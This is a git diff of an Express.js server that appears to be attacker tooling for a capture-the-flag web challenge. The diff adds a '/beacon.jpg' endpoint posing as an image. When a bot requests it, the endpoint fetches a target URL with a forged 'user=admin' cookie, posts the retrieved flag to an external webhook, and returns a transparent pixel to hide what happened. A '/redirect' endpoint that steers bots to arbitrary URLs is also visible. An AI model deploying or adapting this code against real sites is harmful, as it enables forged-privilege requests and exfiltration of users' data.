@@ -41,7 +41,7 @@ app.get('/proxy', async (req, res) => {
   }
 });
 
-// 🔽 新しく追加：BotをリダイレクトさせるHTMLを返すエンドポイント
+// 🔽 BotをリダイレクトさせるHTMLを返すエンドポイント
 app.get('/redirect', (req, res) => {
   const target = req.query.url;
 
@@ -58,6 +58,39 @@ app.get('/redirect', (req, res) => {
       </body>
     </html>
   `);
+});
+
+// 🔽 Botが<img>でアクセスする用の偽装画像エンドポイント
+app.get('/beacon.jpg', async (req, res) => {
+  const target = req.query.url;
+  if (!target) return res.status(400).send('Missing url parameter');
+
+  try {
+    const flagRes = await fetch(target, {
+      headers: { cookie: 'user=admin' }
+    });
+
+    const flagText = await flagRes.text();
+
+    // フラグをWebhookにPOST
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      body: flagText,
+      headers: { 'Content-Type': 'text/plain' }
+    });
+
+    // ダミー画像返却（透明1px PNG）
+    const transparentGif = Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADElEQVR42mP8z/C/HwAFAgH/YOEGiQAAAABJRU5ErkJggg==',
+      'base64'
+    );
+
+    res.setHeader('Content-Type', 'image/png');
+    res.send(transparentGif);
+  } catch (err) {
+    console.error('[beacon] error:', err);
+    res.status(500).send('error');
+  }
 });
 
 app.listen(PORT, () => {
